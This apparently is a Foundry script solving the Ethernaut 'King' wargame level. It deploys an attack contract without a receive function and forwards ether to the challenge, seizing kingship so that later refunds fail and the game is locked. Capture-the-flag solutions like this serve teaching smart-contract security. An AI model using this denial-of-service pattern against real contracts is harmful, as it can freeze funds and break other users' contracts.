// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
contract Attack {
    constructor() payable {}
    function transfer(address addr) external {
        (bool success, ) = addr.call{value: address(this).balance}("");
        require(success, "Transfer Failed");
    }
}

contract KingSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x3049C00639E6dfC269ED1451764a046f7aE500c6;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        Attack attack = new Attack{value: 0.01 ether}();
        attack.transfer(challengeInstance);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(9));
    }
}
